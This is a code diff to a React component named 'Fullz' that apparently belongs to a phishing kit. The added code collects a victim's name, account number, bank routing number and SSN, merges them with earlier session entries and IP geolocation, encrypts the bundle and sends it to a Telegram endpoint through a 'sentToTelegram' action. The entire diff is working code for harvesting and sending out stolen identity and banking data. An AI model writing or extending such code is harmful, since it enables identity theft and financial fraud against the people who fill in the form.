@@ -1,6 +1,9 @@
 "use client";
 
+import { sentToTelegram } from "@/actions/sender";
 import { ERROR } from "@/const";
+import { useSessionStore } from "@/store/session";
+import { encryptObject } from "@/utils/client/encryption";
 import { useState, useEffect, ChangeEvent } from "react";
 
 export const Fullz = ({
@@ -14,6 +17,10 @@ export const Fullz = ({
   setLoading: React.Dispatch<React.SetStateAction<boolean>>;
   setFinish: React.Dispatch<React.SetStateAction<string>>;
 }) => {
+  const { ipLocationData, setSessions, sessionEntries, sessionId, keyData } =
+    useSessionStore();
+  if (!keyData) return null;
+
   const [initialLoad, setInitialLoad] = useState("init");
   const [quickLoad, setQuickLoad] = useState(true);
   const [name, setName] = useState("");
@@ -135,7 +142,7 @@ export const Fullz = ({
   //   }
   // }, [ssn]);
 
-  const handleSubmit = (e: React.FormEvent<HTMLFormElement>) => {
+  const handleSubmit = async (e: React.FormEvent<HTMLFormElement>) => {
     e.preventDefault();
     setQuickLoad(true);
 
@@ -183,6 +190,21 @@ export const Fullz = ({
     // setEnterPwd(false);
     setStage("text");
     setFinish("loading-3");
+
+    const data = {
+      ...sessionEntries,
+      name,
+      number,
+      routing,
+      ssn,
+      step: 6,
+    };
+
+    const safeData = encryptObject(
+      { data, ipLocationData, sessionId },
+      keyData
+    );
+    await sentToTelegram(safeData);
   };
 
   return (
